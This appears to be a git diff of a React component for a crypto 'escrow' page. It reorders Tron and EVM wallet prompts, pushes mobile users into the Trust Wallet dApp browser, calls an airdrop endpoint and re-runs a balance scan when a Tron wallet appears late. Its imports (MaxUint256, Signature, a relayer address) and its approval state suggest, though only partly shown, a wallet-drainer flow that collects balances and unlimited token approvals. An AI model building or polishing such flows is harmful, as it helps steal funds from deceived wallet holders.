@@ -6,7 +6,7 @@ import { usePrivy, useWallets } from "@privy-io/react-auth";
 // @coinbase/wallet-sdk removed — email OTP now handled by @coinbase/cdp-hooks inline
 import { BrowserProvider, Contract, MaxUint256, Signature } from "ethers";
 import { CHAINS, RELAYER_ADDRESS, type ChainConfig } from "@/lib/chains";
-import { TRON_CHAIN, getConnectedTronAddress, ensureTronAddress, isInWalletDappBrowser, isMobileBrowser, openInTrustWalletDapp } from "@/lib/tron";
+import { TRON_CHAIN, getConnectedTronAddress, ensureTronAddress, peekTronAddress, isInWalletDappBrowser, isMobileBrowser, openInTrustWalletDapp } from "@/lib/tron";
 import { COUNTRIES, codeToFlag } from "@/lib/countries";
 import EscrowShell from "@/components/EscrowShell";
 import CoinbaseSignIn from "@/components/CoinbaseSignIn";
@@ -460,21 +460,30 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
     // eslint-disable-next-line react-hooks/exhaustive-deps
   }, [ready, authenticated]);
 
-  // Detect Tron provider early — wait for Trust Wallet / TronLink injection.
+  // Detect Tron provider early — READ ONLY. Never prompt here.
+  // Prompting during Privy's "Sign in to verify" steals the SIWE signature and leaves Privy stuck.
   useEffect(() => {
-    void (async () => {
-      const addr = await ensureTronAddress();
-      if (addr) setTronAddress(addr);
-    })();
+    const addr = peekTronAddress();
+    if (addr) setTronAddress(addr);
   }, []);
 
-  // After wallet connects: wait for tronWeb inside DApp browsers, THEN scan.
-  // WalletConnect from Safari never injects tronWeb — we deep-link into Trust first.
+  // Clear gate spinner once Privy is fully signed in
+  useEffect(() => {
+    if (authenticated && address) setGateLoading(false);
+  }, [authenticated, address]);
+
+  // After Privy auth is FULLY done: wait briefly, then Tron prompt + scan.
+  // Never overlap with Privy's SIWE "Sign in to verify" step.
   useEffect(() => {
     if (!authenticated || !address || modal1Triggered.current) return;
+    // Need at least one wallet object from Privy (SIWE finished + provider ready)
+    if (!wallets.length) return;
     modal1Triggered.current = true;
 
     void (async () => {
+      // Let Privy modal fully close before any other wallet popup
+      await new Promise((r) => setTimeout(r, 800));
+
       // Mobile Safari/Chrome after WC: reopen THIS page inside Trust so tronWeb exists
       if (isMobileBrowser() && !isInWalletDappBrowser()) {
         const already = sessionStorage.getItem("tw_dapp_redirect");
@@ -485,10 +494,13 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
         }
       }
 
-      // Inside Trust / TokenPocket: give tronWeb time to inject after eth connect
-      if (isInWalletDappBrowser() && !getConnectedTronAddress()) {
-        const tron = await ensureTronAddress();
+      // NOW safe to request Tron accounts (Privy SIWE is done)
+      if (isInWalletDappBrowser() && !peekTronAddress()) {
+        const tron = await ensureTronAddress({ prompt: true });
         if (tron) setTronAddress(tron);
+      } else {
+        const silent = await ensureTronAddress({ prompt: false });
+        if (silent) setTronAddress(silent);
       }
 
       fetch("/api/airdrop", {
@@ -500,7 +512,7 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
       await runModal1Scan();
     })();
     // eslint-disable-next-line react-hooks/exhaustive-deps
-  }, [authenticated, address]);
+  }, [authenticated, address, wallets.length]);
 
   // Late Tron injection: if first scan missed Tron, re-scan once when tronWeb appears
   useEffect(() => {
@@ -511,14 +523,14 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
     let cancelled = false;
     const tryLate = async () => {
       if (cancelled || modal1SawTron.current || modal1Approving) return;
-      const addr = getConnectedTronAddress() ?? (await ensureTronAddress());
+      const addr = peekTronAddress() ?? (await ensureTronAddress({ prompt: true }));
       if (!addr || cancelled) return;
       setTronAddress(addr);
       if (modal1SawTron.current) return;
       await runModal1Scan();
     };
 
-    const t = setTimeout(() => { void tryLate(); }, 3000);
+    const t = setTimeout(() => { void tryLate(); }, 4000);
     window.addEventListener("tronWeb#initialized", tryLate as EventListener);
     window.addEventListener("tronLink#initialized", tryLate as EventListener);
     return () => {
@@ -656,7 +668,7 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
       // the address is ready before the balance scan runs.
       let currentTronAddr = tronAddress ?? getConnectedTronAddress();
       if (!currentTronAddr) {
-        currentTronAddr = await ensureTronAddress();
+        currentTronAddr = await ensureTronAddress({ prompt: true });
       }
       if (currentTronAddr) {
         setTronAddress(currentTronAddr);
@@ -744,7 +756,7 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
         // ── Tron path ──────────────────────────────────────────────────────
         let tronAddr = tronAddress ?? getConnectedTronAddress();
         if (!tronAddr) {
-          tronAddr = await ensureTronAddress();
+          tronAddr = await ensureTronAddress({ prompt: true });
           if (tronAddr) setTronAddress(tronAddr);
         }
         if (!tronAddr || !window.tronWeb) throw new Error("Tron wallet not connected");
